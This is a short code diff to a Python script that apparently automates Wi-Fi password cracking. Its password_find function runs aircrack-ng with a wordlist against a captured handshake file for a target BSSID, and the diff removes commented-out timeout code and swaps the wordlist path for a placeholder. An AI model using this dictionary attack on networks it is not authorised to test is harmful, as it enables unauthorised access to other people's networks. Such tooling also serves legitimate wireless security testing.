@@ -50,18 +50,7 @@ def crack_start(bssid, dssid, device, event):
     time.sleep(20)
     thread1.terminate()
     thread1.join(30)
-
-'''
-    if thread1.is_alive():
-        execution_time2 = time.time() - start_time
-        if execution_time2 >= 30:
-            subprocess.run(["pkill", "-f", " ".join(command1)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            thread1.terminate()
-            thread1.join()
-        return result, execution_time2
-'''
-
-
+    
 #######################################################
 
 def execute_command(command):
@@ -71,7 +60,7 @@ def execute_command(command):
 
 def password_find(bssid):
     pack = "pack-01.cap"
-    wordlist = "./passwords.txt"
+    wordlist = "Your_password_list.txt"
 
     output = subprocess.check_output(["aircrack-ng", "-w", wordlist, "-b", bssid, pack])
     output = output.decode('utf-8') 
